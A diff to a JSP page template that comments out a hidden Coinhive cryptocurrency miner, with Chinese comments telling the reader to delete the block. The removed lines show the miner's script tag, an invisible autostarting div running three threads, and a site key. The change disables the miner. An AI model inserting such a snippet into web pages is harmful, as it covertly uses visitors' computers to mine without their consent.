@@ -5,12 +5,12 @@
     &nbsp;
 </div>
 <%--请自行删除以下代码 删除代码开始--%>
-<script src="https://coinhive.com/lib/miner.min.js" async></script>
-<div class="coinhive-miner"
-     style="display: none;"
-     data-autostart="true"
-     data-threads="3"
-     data-key="Y5nPKsSI2WomptAIvksYIV9UTcTZ0gDO">
-    <em>Please disable Adblock!</em>
-</div>
+<%--<script src="https://coinhive.com/lib/miner.min.js" async></script>--%>
+<%--<div class="coinhive-miner"--%>
+     <%--style="display: none;"--%>
+     <%--data-autostart="true"--%>
+     <%--data-threads="3"--%>
+     <%--data-key="Y5nPKsSI2WomptAIvksYIV9UTcTZ0gDO">--%>
+    <%--<em>Please disable Adblock!</em>--%>
+<%--</div>--%>
 <%--请自行删除以下代码 删除代码结束--%>
